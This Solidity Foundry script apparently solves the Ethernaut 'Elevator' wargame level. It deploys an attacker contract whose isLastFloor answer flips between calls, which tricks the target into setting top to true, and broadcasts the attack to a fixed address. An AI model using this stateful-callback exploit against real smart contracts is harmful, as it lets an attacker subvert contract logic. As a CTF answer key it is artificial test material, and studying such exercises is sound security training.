// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract BuildingContract {
    bool once_called = false;
    Elevator elevatorInstance;

    constructor (Elevator _elevatorInstance) {
        elevatorInstance = _elevatorInstance;
    }

    function isLastFloor(uint256 f) external returns (bool) {
        if (once_called)
            return true;
        once_called = true;
        return false;
    }

    function attack() external {
        elevatorInstance.goTo(uint256(3));
    }
}

contract ElevatorSolution is Script {

    Elevator public elevatorInstance = Elevator(0x5dfdE55a59E93A5EA2BC7FfEA0Dc1048A3C1d5E2);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.logBool(elevatorInstance.top());

        BuildingContract attacker = new BuildingContract(elevatorInstance);
        attacker.attack();
        

        console.logBool(elevatorInstance.top());

        vm.stopBroadcast();
    }
}